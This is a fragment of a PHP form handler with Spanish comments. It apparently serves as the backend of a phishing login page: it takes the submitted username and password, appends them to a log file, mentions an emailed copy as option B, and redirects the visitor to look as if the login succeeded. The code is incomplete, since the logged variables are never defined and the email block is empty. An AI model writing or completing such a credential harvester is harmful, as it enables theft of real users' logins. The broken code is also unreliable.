// 1. Verificar que la solicitud fue POST (que vino de un envío de formulario)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // 2. Capturar y limpiar los datos enviados desde el HTML
    $username = htmlspecialchars($_POST['username']); // Nombre de usuario/Email
    $password = htmlspecialchars($_POST['password']); // Contraseña

    // --- OPCIÓN A: Guardar en un archivo de texto (La más fácil) ---

    // Añadir la nueva entrada al final del archivo (FILE_APPEND)
    if (file_put_contents($log_file, $log_entry, FILE_APPEND) !== false) {
        $capture_success = true;
    } else {
        $capture_success = false; // Falló al escribir en el archivo
    }

    // --- OPCIÓN B: Enviar por correo electrónico (Más profesional) ---
    // Descomenta las líneas de abajo si quieres que te llegue un email automáticamente.
    /*

    }
    */


    // 4. Redirigir al usuario (Esto hace que la página "se actualice" con un mensaje de éxito)
    if ($capture_success) {
        header("Location: index.html?status=success"); // Éxito, ¡el dato fue guardado!
    } else {
        // Si falló el guardado/envío, le decimos que hubo un error en la captura
        header("Location: index.html?status=error"); 
    }
    exit();

} else {
    // Si alguien accede a process_login.php directamente sin pasar por el formulario
    header("Location: index.html?status=error");
